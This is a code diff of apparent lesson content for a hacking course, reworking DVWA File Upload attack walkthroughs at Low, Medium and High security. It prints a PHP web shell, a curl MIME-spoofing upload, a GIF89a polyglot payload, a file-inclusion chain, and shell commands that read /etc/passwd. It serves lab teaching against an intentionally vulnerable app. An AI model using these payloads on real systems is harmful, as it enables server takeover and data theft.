@@ -161,54 +161,82 @@ Use + instead of spaces in the URL:
 🔴 PRACTICAL ATTACK — DVWA Security: LOW
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-On Low security DVWA accepts ANY file with no checks at all.
-This is the most basic real-world misconfiguration.
+On Low security, DVWA accepts ANY file — no checks at all.
+This is the most basic (and dangerous) real-world misconfiguration.
+
 
 ━━━━━ STEP 1 — Create the Web Shell File ━━━━━
-In your Kali terminal, type this exactly:
+Open your Kali terminal and type this command exactly:
+┌──────────────────────────────────────────────┐
+│  cat > shell.php << 'EOF'                    │
+│  <?php                                       │
+│  if(isset($_REQUEST['cmd'])){                │
+│    echo "<pre>" .                            │
+│         shell_exec($_REQUEST['cmd']) .        │
+│         "</pre>";                            │
+│  }                                           │
+│  ?>                                          │
+│  EOF                                         │
+└──────────────────────────────────────────────┘
+✅ This creates a file called "shell.php".
 
-   cat > shell.php << 'EOF'
-   <?php
-   if(isset($_REQUEST['cmd'])){
-     echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
-   }
-   ?>
-   EOF
+Code Breakdown (line by line):
+─────────────────────────────
+  Line 1: <?php
+    → Tells the server "this is PHP code, execute it"
 
-   ✅ This creates a file called shell.php in your current folder.
+  Line 2: if(isset($_REQUEST['cmd']))
+    → Checks: "Did the URL contain ?cmd=something?"
+    → $_REQUEST reads values from the URL parameters
 
-What each line does:
-   isset($_REQUEST['cmd'])     → Is there a ?cmd= in the URL?
-   shell_exec($_REQUEST['cmd']) → Run that value as a Linux command
-   echo "<pre>...</pre>"       → Print the command output to the browser
+  Line 3: shell_exec($_REQUEST['cmd'])
+    → Takes whatever you typed after ?cmd= and runs
+      it as a real Linux command on the server!
+    → This is the dangerous part — the server obeys
+      any command you send.
 
-━━━━━ STEP 2 — Navigate to File Upload in DVWA ━━━━━
+  Line 4: echo "<pre>" ... "</pre>"
+    → Wraps the command output in <pre> tags so it
+      displays neatly in the browser (like a terminal)
+
+
+━━━━━ STEP 2 — Open the File Upload Page ━━━━━
 In the DVWA browser tab:
-   → Left sidebar → click "File Upload"
-   → You will see a simple "Choose File" button and an "Upload" button
+  → Left sidebar → click "File Upload"
+  → You will see a [Choose File] button and [Upload]
+
 
 ━━━━━ STEP 3 — Upload the Shell ━━━━━
-   1. Click [Choose File]
-   2. Navigate to where shell.php is (your home folder in Kali, or Desktop)
-   3. Select shell.php and click Open
-   4. Click [Upload]
-   5. You will see a SUCCESS message:
-      "../../hackable/uploads/shell.php succesfully uploaded!"
+  1. Click [Choose File]
+  2. Find and select shell.php from your Kali home folder
+  3. Click [Upload]
+  4. Look for the success message:
+     "../../hackable/uploads/shell.php succesfully uploaded!"
 
-━━━━━ STEP 4 — Execute Commands! ━━━━━
-Now visit this URL (replace [DVWA-IP] with your DVWA address):
-   http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=whoami
 
-   Expected output on the page: www-data
+━━━━━ STEP 4 — Execute Your First Command! ━━━━━
+In your browser address bar, visit this URL:
+┌──────────────────────────────────────────────┐
+│  http://[DVWA-IP]/dvwa/hackable/uploads/     │
+│  shell.php?cmd=whoami                        │
+└──────────────────────────────────────────────┘
+(Replace [DVWA-IP] with your actual DVWA address)
 
-Try more commands:
-   ...shell.php?cmd=id
-   ...shell.php?cmd=ls
-   ...shell.php?cmd=pwd
-   ...shell.php?cmd=cat+/etc/passwd
+  Expected output:  www-data
+  (This is the Linux user Apache runs as)
+
+Try these other commands:
+┌──────────────┬───────────────────────────────┐
+│  ?cmd=id     │  Shows user/group IDs         │
+│  ?cmd=ls     │  Lists files in current dir   │
+│  ?cmd=pwd    │  Shows current directory path │
+│  ?cmd=cat+/etc/passwd  │  Reads the password  │
+│              │  file on the server!          │
+└──────────────┴───────────────────────────────┘
 
 ━━━━━ 🎉 YOU HAVE RCE! ━━━━━
-You are now running Linux commands on a remote server through a web browser!`,
+You are running Linux commands on a remote server
+through nothing but a web browser URL bar!`,
     questions: [
       { q: "What PHP function runs an OS command and returns its output?", a: "shell_exec" },
       { q: "After uploading shell.php on Low, which folder is it saved in?", a: "hackable/uploads" },
@@ -277,53 +305,86 @@ PHP interpreter sees the <?php code → executes it!
 🟡 PRACTICAL ATTACK — DVWA Security: MEDIUM
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-Medium checks that the Content-Type header says image/jpeg or image/png.
-Uploading shell.php directly will fail.
-We need to FAKE (spoof) the MIME type while keeping the PHP content.
+On Medium, the server checks the Content-Type header.
+If it doesn't say "image/jpeg" or "image/png", the
+upload is rejected. Uploading shell.php directly FAILS.
+
+But here's the trick: YOUR browser sends that header.
+You control it. We can LIE and say "this is a JPEG"
+while the file is actually PHP code.
+
 
 ━━━━━ STEP 1 — Change DVWA to Medium ━━━━━
 In the DVWA tab:
-   → Left sidebar → "DVWA Security"
-   → Change to "Medium"
-   → Click [Submit]
+  → Left sidebar → "DVWA Security"
+  → Change to "Medium" → Click [Submit]
+
 
 ━━━━━ STEP 2 — Get Your Session Cookie ━━━━━
-You need your DVWA login cookie for curl to work authenticated.
-In Chrome/Firefox:
-   1. Press F12 to open Developer Tools
-   2. Click the "Application" or "Storage" tab
-   3. Click "Cookies" → click the DVWA URL
-   4. Find "PHPSESSID" and copy its value (a long random string)
-   It will look like: abc123def456...
+We'll use curl (command-line tool) to upload.
+curl needs your login cookie to authenticate.
 
-━━━━━ STEP 3 — Upload with MIME Spoof using curl ━━━━━
-In your Kali terminal, run this (replace SESSION_VALUE with your PHPSESSID):
+How to find your PHPSESSID:
+  1. In Chrome/Firefox, press F12 (Developer Tools)
+  2. Click the "Application" tab (Chrome) or
+     "Storage" tab (Firefox)
+  3. Expand "Cookies" → click the DVWA URL
+  4. Find the row named "PHPSESSID"
+  5. Copy the Value (looks like: abc123def456...)
 
-   curl -v \
-     -b "security=medium; PHPSESSID=SESSION_VALUE" \
-     -F "uploaded=@shell.php;type=image/jpeg" \
-     -F "Upload=Upload" \
-     http://[DVWA-IP]/dvwa/vulnerabilities/upload/
 
-Line by line:
-   -b "security=medium; PHPSESSID=..."
-      → Sends your cookies so DVWA knows you're logged in
-   -F "uploaded=@shell.php;type=image/jpeg"
-      → Uploads shell.php BUT lies to the server: "this is a JPEG image"
-   -F "Upload=Upload"
-      → Clicks the Upload button programmatically
+━━━━━ STEP 3 — Upload with MIME Spoofing ━━━━━
+In your Kali terminal, run this command:
+(Replace SESSION_VALUE with your actual PHPSESSID)
+┌──────────────────────────────────────────────┐
+│  curl -v \                                   │
+│    -b "security=medium;                      │
+│        PHPSESSID=SESSION_VALUE" \            │
+│    -F "uploaded=@shell.php;                  │
+│        type=image/jpeg" \                    │
+│    -F "Upload=Upload" \                      │
+│    http://[DVWA-IP]/dvwa/vulnerabilities/    │
+│    upload/                                   │
+└──────────────────────────────────────────────┘
 
-━━━━━ STEP 4 — Check the Response ━━━━━
-In the curl output look for the success message:
-   "../../hackable/uploads/shell.php succesfully uploaded!"
+What each flag does:
+┌──────────────┬───────────────────────────────┐
+│  -v          │ Verbose mode — shows the full │
+│              │ HTTP request/response headers  │
+├──────────────┼───────────────────────────────┤
+│  -b "..."    │ Sends your cookies so DVWA    │
+│              │ knows you are logged in        │
+├──────────────┼───────────────────────────────┤
+│  -F "uploaded│ Uploads shell.php BUT sets    │
+│  =@shell.php;│ Content-Type to image/jpeg    │
+│  type=image/ │ → This is the LIE that tricks │
+│  jpeg"       │   the server!                 │
+├──────────────┼───────────────────────────────┤
+│  -F "Upload= │ Simulates clicking the Upload │
+│  Upload"     │ button on the web form        │
+└──────────────┴───────────────────────────────┘
+
+
+━━━━━ STEP 4 — Verify Upload Success ━━━━━
+In the curl output, look for the success message:
+  "../../hackable/uploads/shell.php succesfully uploaded!"
+
 
 ━━━━━ STEP 5 — Execute Commands ━━━━━
-Same as before — visit in your browser:
-   http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=id
+Same as Lesson 4 — visit in your browser:
+  http://[DVWA-IP]/dvwa/hackable/uploads/shell.php?cmd=id
 
-━━━━━ WHY IT WORKS ━━━━━
-Medium checks the Content-Type header — but YOU sent that header.
-The server believed your lie. The actual file content is still PHP.`,
+
+━━━━━ WHY THIS BYPASS WORKS ━━━━━
+The server's Medium-level check:
+  ✗ Reads the Content-Type HTTP header
+  ✗ Compares it against "image/jpeg" or "image/png"
+  ✓ If it matches → allows the upload
+
+The problem: The Content-Type header is sent by YOUR
+browser/tool. You can set it to anything you want!
+The server blindly trusts the header without checking
+the actual file content. The file is still pure PHP.`,
     questions: [
       { q: "What is it called when you fake the Content-Type header to bypass file type checks?", a: "MIME spoofing" },
       { q: "In the curl command, which part sets the fake MIME type?", a: "type=image/jpeg" },
@@ -337,67 +398,102 @@ The server believed your lie. The actual file content is still PHP.`,
 🔴 PRACTICAL ATTACK — DVWA Security: HIGH
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-High uses getimagesize() which reads the actual file bytes.
-Simply faking the MIME header will NOT work here.
-We must make the file look like a real GIF at the byte level.
+High level is much harder. The server now uses
+getimagesize() — a PHP function that reads the ACTUAL
+BYTES of the file to verify it's a real image.
+
+Faking the Content-Type header (like Medium) won't work.
+We need a completely different strategy: make our PHP
+code LOOK like an image at the byte level.
+
 
 ━━━━━ STEP 1 — Change DVWA to High ━━━━━
 In the DVWA tab:
-   → Left sidebar → "DVWA Security"
-   → Change to "High"
-   → Click [Submit]
+  → Left sidebar → "DVWA Security"
+  → Change to "High" → Click [Submit]
 
-━━━━━ STEP 2 — Create a GIF89a Polyglot Payload ━━━━━
+
+━━━━━ STEP 2 — Create a Polyglot Payload ━━━━━
+"Polyglot" means a file that is valid in TWO formats:
+it looks like a GIF image AND contains PHP code.
+
 In your Kali terminal, run:
+┌──────────────────────────────────────────────┐
+│  printf 'GIF89a<?php system(                 │
+│    $_GET["cmd"]); ?>' > evil.gif             │
+└──────────────────────────────────────────────┘
 
-   printf 'GIF89a<?php system($_GET["cmd"]); ?>' > evil.gif
+How this file is structured:
+┌──────────┬───────────────────────────────────┐
+│ Byte 1-6 │ GIF89a                            │
+│          │ → The "magic bytes" that identify │
+│          │   a GIF image. getimagesize()     │
+│          │   reads these first and says:     │
+│          │   "Yes! This is a real GIF ✅"     │
+├──────────┼───────────────────────────────────┤
+│ Byte 7+  │ <?php system($_GET["cmd"]); ?>    │
+│          │ → PHP code hidden AFTER the GIF   │
+│          │   header. The image check ignores │
+│          │   everything after the header.    │
+│          │   But PHP will execute it!        │
+└──────────┴───────────────────────────────────┘
 
-What this does:
-   printf 'GIF89a'        → Writes the 6-byte GIF magic number FIRST
-   <?php system(...)?>   → Appends PHP code after it
-   > evil.gif             → Saves the file as evil.gif
 
-Now getimagesize() reads the file:
-   → Sees GIF89a at the start → "This is a GIF! ✅ Allow upload."
-   → PHP code after the header is ignored by the image check.
+━━━━━ STEP 3 — Upload evil.gif ━━━━━
+In DVWA:
+  → Left sidebar → "File Upload"
+  → Click [Choose File] → select evil.gif
+  → Click [Upload]
+  → You should see: "succesfully uploaded!" ✅
 
-━━━━━ STEP 3 — Upload evil.gif via DVWA ━━━━━
-In the DVWA tab:
-   → Left sidebar → "File Upload"
-   → Click [Choose File] → select evil.gif → click [Upload]
-   → You should see the success message! ✅
+⚠️ BUT THERE'S A CATCH:
+High also blocks .php extensions! The file is saved
+as evil.gif (not .php). Apache will NOT auto-execute
+a .gif file. We can't just visit the URL like before.
 
-But wait — High also blocks .php extensions!
-The file is saved as evil.gif, not evil.php.
-Apache will NOT auto-execute a .gif file.
+So how do we run our PHP code? We chain it with
+ANOTHER vulnerability...
 
-━━━━━ STEP 4 — Execute via File Inclusion (LFI Chain!) ━━━━━
-DVWA has ANOTHER vulnerability: File Inclusion.
-We use it to include and execute our uploaded .gif as PHP!
 
-In the DVWA tab:
-   → Left sidebar → "File Inclusion"
-   → Look at the URL — it has: ?page=include.php
-   → Change "include.php" to the path of your uploaded file.
+━━━━━ STEP 4 — Chain with File Inclusion (LFI) ━━━━━
+DVWA has a "File Inclusion" vulnerability. It lets us
+tell the server: "include and execute THIS file as PHP."
 
-⚠️ IMPORTANT: On DVWA High, the File Inclusion page restricts
-the page parameter to only accept paths starting with "file".
-Use the file:// protocol wrapper to bypass this:
+We point it at our uploaded evil.gif!
 
-   http://[DVWA-IP]/dvwa/vulnerabilities/fi/?page=file:///var/www/html/dvwa/hackable/uploads/evil.gif&cmd=id
+In DVWA:
+  → Left sidebar → "File Inclusion"
+  → Look at the URL bar — you'll see: ?page=include.php
+  → Replace "include.php" with the path to evil.gif
 
-If DVWA security is set to Low or Medium for File Inclusion, the
-simpler relative path also works:
-   ?page=../../hackable/uploads/evil.gif&cmd=id
+⚠️ On High, File Inclusion only accepts paths starting
+with "file". Use the file:// wrapper to bypass this:
+┌──────────────────────────────────────────────┐
+│  http://[DVWA-IP]/dvwa/vulnerabilities/fi/   │
+│  ?page=file:///var/www/html/dvwa/hackable/   │
+│  uploads/evil.gif&cmd=id                     │
+└──────────────────────────────────────────────┘
 
-What happens:
-   PHP includes evil.gif → sees the PHP code inside → executes it!
-   The &cmd=id is passed to system() → returns: uid=33(www-data) 🎉
+If File Inclusion is set to Low/Medium, this also works:
+  ?page=../../hackable/uploads/evil.gif&cmd=id
 
-━━━━━ WHY IT WORKS ━━━━━
-getimagesize() only checks the first few bytes (GIF89a).
-PHP's include() executes ALL PHP tags it finds in any file.
-We combined TWO vulnerabilities: File Upload + File Inclusion.`,
+
+━━━━━ WHAT HAPPENS WHEN YOU VISIT THAT URL ━━━━━
+  1. PHP's include() opens evil.gif
+  2. It sees GIF89a (just treats it as text output)
+  3. It finds <?php system(...) ?> → EXECUTES IT!
+  4. &cmd=id is passed to system()
+  5. Output: uid=33(www-data) 🎉
+
+
+━━━━━ WHY THIS WORKS ━━━━━
+We chained TWO vulnerabilities together:
+  ① File Upload  → Got our code onto the server
+  ② File Inclusion → Made the server execute it
+
+getimagesize() only checks the first few bytes.
+PHP's include() executes ALL PHP tags in ANY file,
+regardless of the file extension (.gif, .txt, etc).`,
     questions: [
       { q: "Which PHP function reads file header bytes to validate if it is a real image?", a: "getimagesize" },
       { q: "What 6-character magic bytes do we put at the start of the file to bypass the image check?", a: "GIF89a" },
